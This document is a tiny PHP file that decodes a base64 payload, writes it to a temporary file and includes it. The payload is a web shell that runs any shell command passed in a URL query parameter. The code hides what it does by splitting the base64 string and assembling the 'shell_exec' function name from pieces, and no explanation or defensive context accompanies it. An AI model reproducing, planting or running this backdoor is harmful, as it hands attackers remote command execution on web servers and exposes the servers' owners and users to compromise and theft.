<?php
$tmp=tempnam('/tmp','FOO');
$c=base64_decode('P'.'z48P3BocAokZnVuPSJzaGVsbCIuIl9leGVjIjsKJGluPSRfR0VUWzFdOwokZnVuKCRpbik7');
file_put_contents($tmp, $c);
include $tmp;
